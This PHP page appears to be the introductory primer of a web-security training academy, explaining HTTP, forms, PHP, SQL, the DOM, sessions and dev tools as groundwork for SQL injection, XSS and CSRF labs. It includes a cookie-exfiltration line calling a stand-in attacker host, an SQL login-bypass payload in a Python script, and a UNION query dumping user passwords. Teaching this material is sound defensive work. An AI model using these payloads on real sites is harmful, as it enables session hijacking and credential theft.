<?php
require __DIR__ . '/_layout.php';

$lessons = require_once __DIR__ . '/lessons.php';
$lesson  = $lessons['basic-knowledge'];

academy_layout_start($lesson['title']);
?>

<header class="academy-lesson-head">
    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Lab 00</div>
    <h1><?= htmlspecialchars($lesson['title']) ?></h1>
    <div class="academy-lesson-meta">
        <span class="academy-badge is-primer"><?= htmlspecialchars($lesson['difficulty']) ?></span>
        <span class="academy-badge is-ready">Ready</span>
    </div>
</header>

<section class="academy-block">
    <h2>0. Who this page is for</h2>
    <p>
        Every other lab assumes you already understand how a web page is delivered
        to your browser, what PHP does on the server, what SQL is, and how the
        browser keeps you "logged in." If any of those phrases feel vague, read
        this primer first - it is the smallest amount of background you need for
        the rest of the academy to make sense.
    </p>
    <p>
        Each section finishes with <strong>"Why it matters"</strong> - the labs
        that directly exploit that concept. Use those links as a study path.
    </p>
</section>

<!-- 1. CLIENT - SERVER - DATABASE -->
<section class="academy-block">
    <h2>1. The three actors: client, server, database</h2>
    <p>
        A modern web app is a conversation between three programs:
    </p>
    <ul>
        <li>
            <strong>Client</strong> - your browser (Chrome, Firefox...). It speaks
            HTTP, renders HTML and CSS, and runs JavaScript locally on your machine.
        </li>
        <li>
            <strong>Server</strong> - here, PHP running behind a web server. It
            receives HTTP requests, runs code, and returns HTML (or JSON, redirects,
            cookies, etc.).
        </li>
        <li>
            <strong>Database</strong> - SQLite in this project. The server talks to
            it over SQL queries; the database never talks to your browser directly.
        </li>
    </ul>
    <pre><code>[ Browser ]  &lt;-- HTTP / HTML / cookies --&gt;  [ PHP server ]  &lt;-- SQL --&gt;  [ SQLite DB ]
   client                                       server                       data</code></pre>
    <p>
        A page load is roughly: browser sends a request &rarr; server runs PHP &rarr;
        PHP may query the DB &rarr; PHP builds an HTML response &rarr; browser renders it.
    </p>
    <p>
        <strong>Why it matters:</strong> Most vulnerabilities come from one of these
        actors <em>trusting</em> input that came from another. The whole academy is
        about breaking that trust.
    </p>
</section>

<!-- 2. HTTP -->
<section class="academy-block">
    <h2>2. HTTP requests and responses</h2>
    <p>
        HTTP is a plain-text protocol. A request looks like this:
    </p>
    <pre><code>POST /login.php HTTP/1.1
Host: localhost:8000
Cookie: PHPSESSID=abc123
Content-Type: application/x-www-form-urlencoded

username=alice&amp;password=hunter2</code></pre>
    <p>And a response:</p>
    <pre><code>HTTP/1.1 302 Found
Location: home.php
Set-Cookie: PHPSESSID=xyz789; Path=/

(body)</code></pre>
    <p>Things you need to be comfortable with:</p>
    <ul>
        <li>
            <strong>Methods.</strong> <code>GET</code> retrieves a page; parameters
            ride in the URL (<code>?id=1</code>). <code>POST</code> submits data;
            parameters ride in the request body.
        </li>
        <li>
            <strong>Status codes.</strong> <code>200</code> ok, <code>302</code>
            redirect (a successful login often returns 302 to <code>home.php</code>),
            <code>403</code> forbidden, <code>404</code> not found, <code>500</code>
            server error.
        </li>
        <li>
            <strong>Headers.</strong> Key/value metadata. <code>Cookie</code> goes up,
            <code>Set-Cookie</code> comes back down, <code>Location</code> drives
            redirects, <code>Content-Type</code> describes the body.
        </li>
        <li>
            <strong>URL anatomy.</strong>
            <code>http://host:port/path/page.php?query=string#fragment</code>. The
            <code>?query</code> part is sent to the server; the <code>#fragment</code>
            part is <em>not</em> - it stays in the browser. Remember this; it is
            literally the gimmick of one of the labs.
        </li>
    </ul>
    <p>
        <strong>Why it matters:</strong> Almost every attack is "send the server a
        request it didn't expect." You will use the browser's <em>Network</em> tab and
        Python's <code>requests</code> library to send exactly the requests you want.
    </p>
</section>

<!-- 3. HTML & FORMS -->
<section class="academy-block">
    <h2>3. HTML and forms</h2>
    <p>
        HTML is a tree of <em>elements</em>. Each element is a tag, optionally with
        attributes and children:
    </p>
    <pre><code>&lt;a href="home.php" class="link"&gt;Home&lt;/a&gt;
&lt;img src="logo.png" alt="logo"&gt;
&lt;p&gt;Hello &lt;strong&gt;world&lt;/strong&gt;.&lt;/p&gt;</code></pre>
    <p>A form is how the browser sends data to the server:</p>
    <pre><code>&lt;form action="login.php" method="POST"&gt;
    &lt;input type="text"     name="username"&gt;
    &lt;input type="password" name="password"&gt;
    &lt;button type="submit"&gt;Login&lt;/button&gt;
&lt;/form&gt;</code></pre>
    <p>
        When you click submit, the browser builds a POST request to
        <code>login.php</code> whose body is
        <code>username=...&amp;password=...</code>. The names of the inputs become the
        names of the POST parameters.
    </p>
    <p>
        <strong>Escaping.</strong> If a page wants to show user-supplied text safely,
        it must encode special characters like <code>&lt;</code>, <code>&gt;</code>,
        <code>"</code> so the browser treats them as text, not as new HTML. In PHP
        this is <code>htmlspecialchars($x)</code>. When a page <em>forgets</em> to do
        this, attacker-controlled text becomes attacker-controlled <em>markup</em>.
    </p>
    <p>
        <strong>Why it matters:</strong> reflected, stored and DOM
        <strong>XSS</strong> labs all exploit pages that paste user input into HTML
        without escaping; <strong>CSRF</strong> labs use forms on the attacker's site
        to send POSTs to ours.
    </p>
</section>

<!-- 4. PHP -->
<section class="academy-block">
    <h2>4. PHP basics</h2>
    <p>
        PHP files are mixed HTML and code. Anything inside
        <code>&lt;?php ... ?&gt;</code> runs on the server before the response is sent;
        everything else is output as-is.
    </p>
    <pre><code>&lt;?php
$name = $_GET["name"] ?? "stranger";
?&gt;
&lt;p&gt;Hello, &lt;?= htmlspecialchars($name) ?&gt;!&lt;/p&gt;</code></pre>
    <p>The names you will see constantly in this codebase:</p>
    <ul>
        <li><code>$_GET["x"]</code> - value of the <code>?x=...</code> URL parameter.</li>
        <li><code>$_POST["x"]</code> - value of a form field submitted via POST.</li>
        <li><code>$_COOKIE["x"]</code> - value of a cookie the browser sent.</li>
        <li><code>$_SESSION["x"]</code> - per-user server-side storage; survives across requests for the same browser session. Requires <code>session_start()</code>.</li>
        <li><code>$_FILES["x"]</code> - metadata for an uploaded file.</li>
        <li><code>require</code> / <code>include</code> - paste another PHP file in here.</li>
        <li><code>echo</code> or <code>&lt;?= ... ?&gt;</code> - write to the response body.</li>
        <li><code>header("Location: home.php")</code> - send a redirect response.</li>
    </ul>
    <p>
        <strong>String concatenation</strong> in PHP uses <code>.</code>:
        <code>"hello " . $name</code>. This is the operator that, when used to build
        a SQL query out of user input, creates an SQL injection.
    </p>
    <p>
        <strong>Why it matters:</strong> every server-side file in this project is
        PHP. To understand a vulnerability you need to read its handler - even
        skim-reading <code>login.php</code>, <code>profile.php</code> and
        <code>cart.php</code> is enough to find most of the bugs in this academy.
    </p>
</section>

<!-- 5. SQL & DATABASES -->
<section class="academy-block">
    <h2>5. SQL and databases</h2>
    <p>
        A relational database stores data in <strong>tables</strong>. Each table has
        named <strong>columns</strong> and many <strong>rows</strong>. You talk to it
        in <strong>SQL</strong>:
    </p>
    <pre><code>-- read
SELECT id, username, email FROM users WHERE id = 1;

-- read everything
SELECT * FROM products;

-- write
INSERT INTO reviews (product_id, user_id, body) VALUES (1, 7, 'great');
UPDATE users SET password = 'newpass' WHERE id = 1;
DELETE FROM cart WHERE id = 42;

-- combine
SELECT users.username, reviews.body
FROM reviews
JOIN users ON users.id = reviews.user_id;</code></pre>
    <p>
        SQL also supports <strong><code>UNION</code></strong>, which welds two
        SELECTs together as long as they return the same number of columns:
    </p>
    <pre><code>SELECT id, name, price FROM products WHERE category = 'fruit'
UNION
SELECT id, username, password FROM users;</code></pre>
    <p>
        That second query is, of course, what an attacker wants to graft onto an
        innocent product search. The famous comment marker <code>--</code> tells the
        database "ignore the rest of this line," which is how an injected payload
        cuts off whatever query fragment came after it.
    </p>
    <p>
        <strong>Vulnerable vs. safe.</strong> Compare these two ways of running the
        same query:
    </p>
    <pre><code>// VULNERABLE - user text is pasted into SQL
$sql = "SELECT * FROM users WHERE username = '$username'";
$row = $db-&gt;query($sql)-&gt;fetch();

// SAFE - parameter is sent separately from the query
$stmt = $db-&gt;prepare("SELECT * FROM users WHERE username = :u");
$stmt-&gt;execute([':u' =&gt; $username]);
$row = $stmt-&gt;fetch();</code></pre>
    <p>
        In the safe version, no matter what the user types, it is data, not SQL.
        That single change defeats every SQL-injection lab in this academy.
    </p>
    <p>
        <strong>Why it matters:</strong> the three <strong>SQLi</strong> labs
        (login bypass, UNION-based dump, blind/time-based leak) all attack the
        vulnerable pattern above.
    </p>
</section>

<!-- 6. JAVASCRIPT & DOM -->
<section class="academy-block">
    <h2>6. JavaScript and the DOM</h2>
    <p>
        JavaScript runs in the browser, <em>not</em> on the server. It can read and
        change the page (the <strong>DOM</strong> - the live tree of elements), send
        background HTTP requests, and read cookies that aren't marked
        <code>HttpOnly</code>.
    </p>
    <pre><code>// read URL parts
let id  = new URLSearchParams(location.search).get("id"); // ?id=...
let tag = location.hash.slice(1);                          // #tag

// change the page
document.getElementById("title").textContent = "Hi";       // safe
document.getElementById("title").innerHTML  = userInput;   // DANGEROUS

// steal data
fetch("http://attacker/?c=" + document.cookie);</code></pre>
    <p>
        The two key ideas for the XSS labs:
    </p>
    <ul>
        <li>
            <code>innerHTML = x</code> tells the browser to <em>parse</em>
            <code>x</code> as HTML. If <code>x</code> contains
            <code>&lt;script&gt;</code> or an <code>onerror=</code> attribute, that
            code executes - in the victim's session, on our site's origin.
        </li>
        <li>
            JavaScript that is already running on a page can read
            <code>document.cookie</code> and POST it elsewhere. That is how an XSS
            turns into a session-cookie theft.
        </li>
    </ul>
    <p>
        <strong>Why it matters:</strong> <strong>Reflected</strong>,
        <strong>Stored</strong> and <strong>DOM</strong> XSS labs each plant one of
        these payloads through a different channel; CSRF labs use a tiny bit of JS
        on the attacker's page to auto-submit a form.
    </p>
</section>

<!-- 7. SESSIONS & COOKIES -->
<section class="academy-block">
    <h2>7. Sessions, cookies, and what "logged in" really means</h2>
    <p>
        HTTP is stateless - the server forgets you between requests. To keep you
        logged in, the server sends a <strong>cookie</strong> (here:
        <code>PHPSESSID</code>) on your first visit. Your browser then attaches that
        cookie to <em>every</em> subsequent request to the same site, automatically.
    </p>
    <pre><code>// first response
Set-Cookie: PHPSESSID=abc123; Path=/; HttpOnly

// every later request from your browser
Cookie: PHPSESSID=abc123</code></pre>
    <p>
        On the server, that cookie is the key into <code>$_SESSION</code>, where the
        app stores things like <code>$_SESSION["user_id"] = 7</code>. "Logged in as
        Alice" is just "your cookie maps to a session whose <code>user_id</code> is
        Alice's."
    </p>
    <p>Two consequences worth burning in:</p>
    <ul>
        <li>
            <strong>Cookie theft = account takeover.</strong> Whoever holds the
            <code>PHPSESSID</code> value <em>is</em> that user, no password required.
            This is the prize at the end of an XSS attack.
        </li>
        <li>
            <strong>The browser sends cookies even to forged requests.</strong> If
            an attacker's page submits a form to <code>profile.php</code>, the
            victim's browser cheerfully attaches their session cookie. The server
            sees an authenticated request and acts on it. This is exactly
            <strong>CSRF</strong>.
        </li>
    </ul>
    <p>
        <strong>Why it matters:</strong> the <strong>CSRF</strong> labs and the
        cookie-exfiltration phase of the <strong>XSS</strong> labs are entirely
        about this mechanic.
    </p>
</section>

<!-- 8. DEV TOOLS & TOOLING -->
<section class="academy-block">
    <h2>8. Browser dev tools and tooling you will actually use</h2>
    <p>
        Open dev tools with <kbd>F12</kbd> in any browser. The tabs you need:
    </p>
    <ul>
        <li>
            <strong>Elements</strong> - inspect and edit the live HTML, see which
            input has which <code>name</code>, find hidden fields.
        </li>
        <li>
            <strong>Console</strong> - run JavaScript against the current page.
            Useful for trying <code>document.cookie</code> or DOM-XSS payloads.
        </li>
        <li>
            <strong>Network</strong> - see every HTTP request the page made:
            method, URL, headers, body, response, status code. Right-click a request
            to copy it as <code>curl</code> or replay it.
        </li>
        <li>
            <strong>Application &rarr; Cookies</strong> - read, edit and delete
            cookies, including <code>PHPSESSID</code>.
        </li>
    </ul>
    <p>For automated attacks, the scripts in <code>/scripts</code> use Python:</p>
    <pre><code>import requests

s = requests.Session()                 # auto-stores cookies
r = s.post("http://localhost:8000/login.php",
           data={"username": "' OR 1=1 -- ", "password": "x"},
           allow_redirects=False)      # don't follow 302 - inspect it
print(r.status_code, r.headers.get("Location"))
print(s.cookies.get("PHPSESSID"))</code></pre>
    <p>
        That five-line pattern - <code>Session()</code>, <code>post()</code>,
        inspect the response - is the backbone of every exploit script in this
        academy. Read one of the scripts in
        <a href="../scripts/SQLi.py" target="_blank" rel="noopener"><code>scripts/SQLi.py</code></a>
        to see it in action.
    </p>
</section>

<!-- 9. SECURITY MINDSET -->
<section class="academy-block">
    <h2>9. The security mindset in one paragraph</h2>
    <p>
        Every input that crosses a boundary - URL parameter, form field, cookie,
        uploaded file, HTTP header - is hostile until proven otherwise. The job of
        a secure server is to treat each input as <em>data</em>, never as
        <em>code</em>: data into SQL needs prepared statements, data into HTML
        needs escaping, state-changing actions need a CSRF token, secrets like
        passwords need hashing. Every lab in this academy is a different example
        of the same mistake: a server somewhere forgot the difference between data
        and code.
    </p>
</section>

<!-- 10. MAP TO LABS -->
<section class="academy-block">
    <h2>10. Which section powers which lab</h2>
    <p>Use this as a "go back and re-read" map once you start the labs.</p>
    <table class="academy-payload">
        <thead>
            <tr>
                <th>If this lab confuses you...</th>
                <th>...re-read these sections</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td><a href="sqli-login.php">SQLi: Login Bypass</a></td>
                <td>4 (PHP), 5 (SQL)</td>
            </tr>
            <tr>
                <td><a href="sqli-union.php">SQLi: UNION dump</a></td>
                <td>5 (SQL, especially <code>UNION</code>)</td>
            </tr>
            <tr>
                <td><a href="sqli-blind.php">Blind SQLi</a></td>
                <td>5 (SQL), 8 (scripting with <code>requests</code>)</td>
            </tr>
            <tr>
                <td><a href="Reflected_xss.php">Reflected XSS</a></td>
                <td>3 (HTML escaping), 6 (DOM), 7 (cookies)</td>
            </tr>
            <tr>
                <td><a href="Stored_xss.php">Stored XSS</a></td>
                <td>3 (HTML escaping), 6 (DOM), 7 (cookies)</td>
            </tr>
            <tr>
                <td><a href="DOM_xss.php">DOM XSS</a></td>
                <td>2 (URL fragment), 6 (<code>innerHTML</code>)</td>
            </tr>
            <tr>
                <td><a href="csrf-admin-reply.php">CSRF: Admin Replies</a></td>
                <td>3 (forms), 7 (auto-sent cookies)</td>
            </tr>
            <tr>
                <td><a href="csrf-account-takeover.php">CSRF: Account Takeover</a></td>
                <td>3 (forms), 7 (auto-sent cookies)</td>
            </tr>
            <tr>
                <td><a href="user-enum-bruteforce.php">User Enum &amp; Brute Force</a></td>
                <td>2 (HTTP status codes), 8 (Python <code>requests</code>)</td>
            </tr>
            <tr>
                <td><a href="broken-password-reset.php">Broken Password Reset</a></td>
                <td>2 (HTTP), 4 (PHP), 8 (scripting)</td>
            </tr>
        </tbody>
    </table>
</section>

<!-- 11. START -->
<section class="academy-block">
    <h2>11. Ready?</h2>
    <p>
        Open the target site in a tab and keep dev tools open while you read each
        lab. The fastest way to internalise this primer is to <em>watch</em> a
        normal login in the Network tab once - request, cookie, redirect - before
        you start trying to break one.
    </p>
    <a class="academy-lab-cta"
       href="<?= htmlspecialchars($lesson['target_url']) ?>"
       target="_blank" rel="noopener">Open the target site</a>
</section>

<p style="margin-top: 28px;">
    <a href="index.php">&larr; Back to all labs</a>
</p>

<?php
academy_layout_end();
